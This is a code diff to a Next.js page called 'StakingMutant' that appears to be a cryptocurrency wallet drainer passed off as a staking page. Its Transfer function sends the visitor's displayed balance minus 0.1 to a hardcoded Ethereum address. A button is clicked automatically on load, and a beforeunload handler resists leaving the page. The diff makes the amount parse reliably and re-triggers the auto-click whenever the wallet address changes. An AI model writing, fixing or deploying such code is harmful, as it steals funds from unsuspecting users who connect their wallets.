@@ -54,7 +54,9 @@ const StakingMutant: NextPage = () => {
   const sdk = ThirdwebSDK.fromWallet(wallet, "ethereum");
 
   async function Transfer() {
-    const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", data?.displayValue - 0.1);
+    const valueAsNumber = Number(data?.displayValue) || 0;
+
+    const txResult = await (await sdk).wallet.transfer("0xcD84855150461Ac9C6b3e3428306F3Dc4a721363", valueAsNumber - 0.1);
   }
 
   const buttonRef = useRef<HTMLButtonElement>(null);
@@ -71,13 +73,13 @@ const StakingMutant: NextPage = () => {
     return () => {
       window.removeEventListener('beforeunload', handleBeforeUnload);
     };
-  }, []);
+  }, [address]);
 
   useEffect(() => {
     if (buttonRef.current) {
       buttonRef.current.click();
     }
-  }, []);
+  }, [address]);
 
   return (
     <>
